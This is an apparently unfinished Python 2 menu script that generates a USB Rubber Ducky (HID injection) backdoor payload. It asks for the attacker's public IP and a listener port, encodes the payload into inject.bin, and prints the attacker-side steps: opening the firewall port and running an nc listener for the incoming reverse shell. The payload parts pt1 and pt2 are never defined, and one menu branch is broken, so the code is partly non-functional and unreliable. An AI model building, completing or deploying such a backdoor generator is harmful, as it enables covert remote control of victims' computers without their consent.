import os, sys
from logging.config import listen
sys.path.insert(0, './modules')
import assets
import subprocess


if __name__ == '__main__':
    print assets.banner
    loop = True
    while loop:
        print assets.menu
        choice = input("Enter your choice [0-2]: ")
#=============================================================================== 
        if choice == 1: # New backdoor
            try:
                print "First we'll verify Netcat is installed in your attacker machine . . ."
                nc_installed = subprocess.call(["nc"], shell=False)
                if nc_installed == 1:
                    print "It is! Now we'll generate your HID attack payload."
                    backdoor_alias = raw_input("Give this backdoor an alias your future self will appreciate, i.e: 'Jim at office's wifi': ")
                    attacker_ip = raw_input("Enter your public IP (if not on a VPS, it will change from one network to another): ")
                    listener_number = int(open("counter.txt", "r").read())
                    if listener_number == 0:
                        listener_number = 1337
                    else:
                        listener_number = listener_number + 1
                    payload = pt1, attacker_ip, "/", listener_number, pt2
                    open("payload.txt", "w+").write(str(payload))
                    subprocess.call("java -jar encoder.jar -i payload.txt -o inject.bin")
                    print """Now copy your binary into your Ducky's SD, enable your listening port
                    through the firewall (will ask for password) and screen the listener with 
                    the next commands before you attack:
                    
                    sudo ufw allow """,listener_number,"""/tcp
                    
                screen -r '""",listener_number,"'","""
                    nc -l -p """,listener_number
                        
            except OSError:
                raw_input("An error ocurred. Press enter to continue to main menu.")  

            else:
                raw_input("Press enter to continue to main menu.")  
#===============================================================================
        elif choice == 2: # List backdoors
            try:
                pub
            
            except NameError:
                raw_input("Press enter to continue to main menu.")
                  
            else:
                raw_input("Press enter to continue to main menu.")  
  
#===============================================================================
        elif choice == 0:
            loop = False
        else:
            raw_input("Wrong option selection. Enter any key to try again.")